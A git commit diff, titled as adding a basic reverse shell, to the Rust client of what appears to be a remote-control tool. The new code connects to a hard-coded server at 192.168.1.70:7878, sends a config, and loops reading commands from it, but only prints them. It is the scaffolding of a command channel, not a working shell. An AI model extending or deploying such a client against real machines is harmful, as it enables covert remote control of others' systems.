eae28a544d6ffb50dcd4baddf823c72ab0c09ffc
Co3lho22 <co3lho22@gmail.com>
2024-03-06 15:38:24 +0000

    add a basic reverse shell to client

--- client/src/main.rs
+++ client/src/main.rs
@@ -1,21 +1,37 @@
-use serde_json::Result;
-use std::net::TcpStream;
+use std::io::{self, Write, Read, BufRead, BufReader};
 use crate::worker::network::connect_server;
 use crate::config::Config;
 
 mod config;
 mod worker;
 
-fn main() -> Result<()> {
+fn main() -> io::Result<()> {
     let ip = String::from("192.168.1.70");
     let port = String::from("7878");
-    let stream = connect_server(ip, port);
+    let mut stream = connect_server(ip.clone(), port.clone())?;
     println!("[I] Connected to server {}:{}.", ip, port);
 
     // Create Config object and serialize it
     let config = Config::new();
     let config_json = config.to_json().expect("Failed to serialize Config");
     stream.write_all(config_json.as_bytes())?;
+    stream.flush()?;
+
+    let mut reader = BufReader::new(&stream);
+    let mut buffer: Vec<u8> = Vec::new();
+
+    loop {
+        buffer.clear();
+        let bytes_read = reader.read_until(b'\n', &mut buffer)?;
+        if bytes_read == 0 {
+            print!("[I] Server closed the connection.");
+            break
+        }
+
+        let command = String::from_utf8_lossy(&buffer);
+        println!("[I] Received command: {}", command.trim_end());
+
+    }
 
     Ok(())
 }
